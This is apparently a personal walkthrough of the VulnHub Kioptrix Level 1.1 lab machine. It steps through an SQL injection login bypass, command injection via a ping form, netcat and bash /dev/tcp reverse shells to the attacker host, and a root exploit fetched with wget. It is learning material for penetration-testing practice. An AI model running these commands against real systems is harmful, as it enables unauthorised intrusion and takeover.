# Kioptrix: Level 1.1 (#2)
[VulnHub link](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)  
By Kioptrix

## Setting Up the Box ##
* The updated version, i.e. second release of the box is the one used here (and not the original release).
* The solution provided in kioptrix-level-1 to set up the box works for this one as well.
* After implementing the solutions, we come across 3 dialog boxes that ask us about some settings when booting up the vulnerable machine, to which I just selected the right-most `Do Nothing` choice.

## Enumeration ##
* We are first greeted with a login page that requires users to specify a set of credentials:
![](/screenshots/kioptrix-level-2/loginInitial.jpg)
* Run `nmap -T5 10.0.2.*`, where we find `10.0.2.15` to be the IP address of the vulnerable machine. 6 services were also discovered, where they are all in an Open state.
![](/screenshots/kioptrix-level-2/nmapScan.jpg)
* Note: This screenshot was updated during a re-visit of the machine.
* Run `nmap -sC -sV -T5 -p- 10.0.2.15` to enumerate the running services:
![](/screenshots/kioptrix-level-2/hostFullScan.jpg)
* Note: This screenshot was updated during a re-visit of the machine.
* Let us start with the Apache httpd service at port 80.

## Apache httpd service at Port 80 ##
* We see a `Remote System Administration Login` page after loading `http://10.0.2.15/` on our browser:
![](/screenshots/kioptrix-level-2/httpHomePage.jpg)
* We note an interesting comment in the page source that probably gives us an existing username `administrator`:
![](/screenshots/kioptrix-level-2/httpHomePageSource.jpg)
* An invalid login attempt does not reveal any error messages.
* No `robots.txt` file was found.
* Running `gobuster dir -u http://10.0.2.15 -w /usr/share/wordlists/dirb/common.txt` does not yield anything of much interest.  (Running the same command and adding the search for .php pages did not yield new results.)
![](/screenshots/kioptrix-level-2/httpGobusterDirScan.jpg)
* Accessing `/manual` leads us to a default page with the `Apache HTTP Server Version 2.0 Documentation`.
* Back to the home page with the login screen, examining a login attempt as a POST request in Burp Suite sets us up for a `hydra` brute-force attempt:
![](/screenshots/kioptrix-level-2/httpHomePageLoginAttempt.jpg)
* Running `hydra -l administrator -P /usr/share/wordlists/rockyou.txt 10.0.2.15 http-form-post '/index.php:uname=^USER^&psw=^PASS^&btnLogin=Login:S=Logout'` for 15 minutes gives us no results. I reran the command with the failure string being set to `psw`, but after 20 minutes, it yielded no results as well. Also tried another 2 runs with the username `admin` instead (with the 2 different success/failure strings).
* Running `nikto -h 10.0.2.15` tells us that the PHP version used is `4.3.9`. Also, it says that the `OPTIONS` HTTP method is enabled, but I could not get it to run. Nothing else much of interest.
![](/screenshots/kioptrix-level-2/niktoScan.jpg)
* Tried the `Apache mod_isapi Dangling Pointer` module on Metasploit ([corresponding Rapid7 page](https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_mod_isapi)), with the RPORT being set to either 80 or 443, but to no avail.
* Tried the `Apache mod_cgi - 'Shellshock' Remote Command Injection` exploit ([corresponding Exploit-DB page](https://www.exploit-db.com/exploits/34900)), but 
it did not work - there were 404s for all of the pages attempted. Wanted to find out which Apache versions were susceptible to this, but could not find the information. In any case, gave this exploit a shot since it was found as the second Google search result for `apache 2.0.52 exploit`.
* I tried a number of SQL injection attempts on the 2 login fields, but they did not work too: `' OR '1=1'`, `' OR 1=1`, `' OR '1=1' --`, `' OR '1=1 --'`.
* **Re-visit**: Apparently I missed out the correct SQL injection string `' or 1=1 --` - silly me.

### Bypassed Login Page ###
* After managing to gain access by SQL injection, we see a page which allows us to ping a machine on the network.
![](/screenshots/kioptrix-level-2/httpHomePageLoginSQLInjected.jpg)
* Entering `10.0.2.16` (a non-alive host), a new window opens (`/pingit.php`), with output being really familiar - the `ping` command on a Unix system was probably used and its output redirected to be printed on the php page. I also tried pinging the vulnerable machine itself, the attacker machine, and `localhost` - and they showed expected positive results.
![](/screenshots/kioptrix-level-2/httpPingitExamples.jpg)
* Pinging `google.com` also works - this means that external hosts can be reached.
* I was wondering if we might be able to run another system command together with `ping`, using a semi-colon (`;`), and true enough we can:
![](/screenshots/kioptrix-level-2/httpPingitVulnerability.jpg)
* We can verify that the service is running as `apache`, and that the OS is `CentOS Release 4.5 (Final)`, which was already divulged to us as the file name to the vulnerable machine.

### Obtaining Low-Privilege Shell ###
* The original idea was to let the vulnerable machine run `nc 10.0.2.6 1234 -e /bin/sh`, and for us to catch the shell with `nc -lvnp 1234`. However, `nc` is most probably not installed on the vulnerable machine, because any `nc` commands do not give any output printed in the `ping` page.
* If I am not wrong, this is the first time that I am encountering a situation where `nc` is not installed. A quick Google search for `getting shell without nc` gives us [this post](https://www.grobinson.me/reverse-shells-even-without-nc-on-linux/) as the first search result.
* **Re-visit; Important learning point**: Reading another walkthrough tells us that not all is as simple as just testing for `nc -help` alone when it comes to checking if `nc` is present on the machine. It turns out that it is, and we have to know the location of the binary: `/usr/local/bin/nc`. The command to be executed in this case is `/usr/local/bin/nc 10.0.2.6 1234 -e /bin/bash`. Alternatively, `/bin/sh` works too.
* The suggestion was to use **bash redirection**. To check whether commands are running inside bash, run `echo $0` (which gives us `sh`) or `echo $SHELL` (which gives us `/sbin/nologin`). This probably means that the commands are running in bash, because `bash &>/dev/tcp/DEST_IP/DEST_PORT <&1` works. (I am guessing that if there is no output from either of the 2 given commands, then bash's TCP redirection command would fail.)
* **Important**: What the bash command does is to "execute bash, and forward stdout and stderr to DEST_IP:DEST_PORT and read stdin from the same."
* `which bash` gives us `/bin/bash`, which tells us that bash is installed. The alternative to commands not running in bash (i.e. above command does not work) is `bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"`. The only difference with this command and the previous one is that this one runs bash (since commands are not already running in it) and executes the command inside bash explictly.
* Either of the 2 commands work. Here, I will use `bash &>/dev/tcp/10.0.2.6/1234 <&1`:
![](/screenshots/kioptrix-level-2/shellConnected.jpg)

### Privilege Escalation (to Root) ###
* Run `python -c 'import pty; pty.spawn("/bin/sh")'` to get our interactive TTY shell.
* `sudo -l` does not run in our current user account - it prompts us for a password.
* The first Google search result for `CentOS 4.5 exploit` gave us our `root` shell, thankfully! The exploit is titled `'ip_append_data()' Ring0 Privilege Escalation (1)`, and its Exploit-DB link is found [here](https://www.exploit-db.com/exploits/9542).
* Side-note: I was wondering if there would be an updated version of this exploit since there was a `(1)` label to it (after my experience with the first Kioptrix machine). However, no results for a `(2)` showed up, and there were no mentions of a more updated exploit in the source code. We would also learn later below that the code compiles and runs just fine.
* I had compiled the code on my Kali machine with `gcc -m32 9542.c`, and ran `python -m SimpleHTTPServer 80`. Afterwards, I would run `wget http://10.0.2.6/a.out` in the `/tmp` directory on the vulnerable machine, before adding executable permissions to it and trying to run it. However, I encountered a `Floating point exception` error message.
* A Google search about such an error reveals that a division-by-zero operation might be taking place. I looked through the source code and could not find anything relating to it.
* Afterwards, I searched for the error message again, and combined it with the exploit name this time: `'ip_append_data()' Ring0 Privilege Escalation floating point exception`. The first Google search result returns a post on Hak5 forums, but the post was no longer available, but Google had a cached version (fortunately).
* Someone was facing a similar error message as me (although his exploit was a different one). He resolved it by compiling it on the machine locally, and that was something that worked for me as well: `gcc` was found to be installed on the vulnerable machine.
* **Note-to-self**: I had earlier tried to run `gcc` before we had a low-privilege shell, and observed no output - and hence thought that `gcc` was not installed. However, what I really should have done is run `gcc --version` instead. Probably just playing around at that time but I sent the wrong message to myself ultimately.
* Instead of downloading the `a.out` file over SimpleHTTPServer, I downloaded the source code instead, and ran a simple `gcc 9542.c`, `a.out` - and we are now `root`!
![](/screenshots/kioptrix-level-2/shellPrivilegeEscalateToRoot.jpg)
* **Alternate method**: A solution proposed by someone else on the Hak5 post to run `gcc -m32 -Wl,--hash-style=both` instead works as well. This way, I could also compile it on my Kali machine before simply downloading only `a.out` on the vulnerable machine to be run.

## SSH service at Port 22 ##
* Tried to login as `root` - nothing special here (no banners or whatsover).
![](/screenshots/kioptrix-level-2/sshLoginAttemptRoot.jpg)

## Apache HTTPS service at Port 443 ##
* We add the site as a security exception as usual, and find the same site as was discovered in Port 80.

## MySQL service at Port 3306 ##
* Running `mysql -h 10.0.2.15` gives us an error message: `ERROR 1130 (HY000): Host '10.0.2.6' is not allowed to connect to this MySQL server`.

## CUPS service at Port 631 ##
* Accessing `10.0.2.15:631` reveals a `Forbidden` page. Intercepting its GET request reveals nothing of interest apart from what we have already picked up in our `nmap` scan:
![](/screenshots/kioptrix-level-2/cupsGetRequest.jpg)
* The same scan mentioned about HTTP methods, and so I changed the GET request to an OPTIONS one:
![](/screenshots/kioptrix-level-2/cupsOptionsRequest.jpg)
* Trying out both POST and PUT methods yielded the same `Forbidden` result.
* According to the [online documentation](https://help.ubuntu.com/lts/serverguide/cups.html), the CUPS service "can be configured and monitored using a web interface, which by default is available at http://localhost:631/admin". Trying to access the `/admin` page does not work out unfortunately.
* Based on the version `1.1` that we are aware of, there appears to be several exploits available for it, according to Exploit-DB.

# Concluding Remarks
The only part where I was stuck for a substantially long amount of time was finding a way to log ourselves in. I was focussing on that rather than thinking to myself - how can I get past the login page (which would have probably given me less of a focus towards getting a valid set of credentials).

While running `hydra`, I was enumerating other services, but came to a nil. I unintentionally came across the phrase `SQL injection` in a link related to this machine while searching for something version-specific. However, I did not hit the correct SQL injection string and reading kongwenbin's walkthrough finally made me understand that I needed to try harder indeed.

**Note-to-self**: Need to learn how to use `sqlmap` properly - I tried to run `sqlmap http://10.0.2.15/index.php --forms` but did not manage to find any positives. Later on, I googled about not being able to find simple SQL injections with the tool and found a [GitHub issue](https://github.com/sqlmapproject/sqlmap/issues/1477) that says that I should use 'high-risk' settings (e.g. `--risk=3`) for OR injections - to which I did, but I was still finding no positives.

# Other Walkthrough References
1. https://kongwenbin.wordpress.com/2016/10/29/writeup-for-kioptrix-level-1-1-2/